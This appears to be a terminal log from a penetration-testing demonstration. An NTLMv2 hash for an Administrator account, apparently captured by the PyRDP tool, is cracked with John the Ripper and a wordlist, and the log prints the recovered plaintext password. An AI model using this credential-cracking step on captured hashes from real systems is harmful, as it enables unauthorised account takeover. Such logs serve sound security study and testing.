```
~ echo 'Administrator::PYRDP-SERVER:f3369761c9f2c764:3fd6db7f2f144ab3725b2d8f570d69b9:01010000000000006ee8dddf00f2d8016465fab3cb232ab40000000002000a00570049004e004e00540001000a00570049004e004e00540004000a00570049004e004e00540003000a00570049004e004e00540005000a00570049004e004e0054000800300030000000000000000100000000200000400f35908761680c62c8f66d50a158a0539fef9b36401ac0c642aa4dec4d8cbb0a0010000000000000000000000000000000000009002a005400450052004d005300520056002f003100390032002e003100360038002e0031002e003100330036000000000000000000' | john --wordlist=passwors.txt /dev/stdin 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
Warning: Only 2 candidates left, minimum 4 needed for performance.
rieToh9p         (Administrator)     
1g 0:00:00:00 DONE (2022-11-06 18:03) 50.00g/s 100.0p/s 100.0c/s 100.0C/s iem9gesh..rieToh9p
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```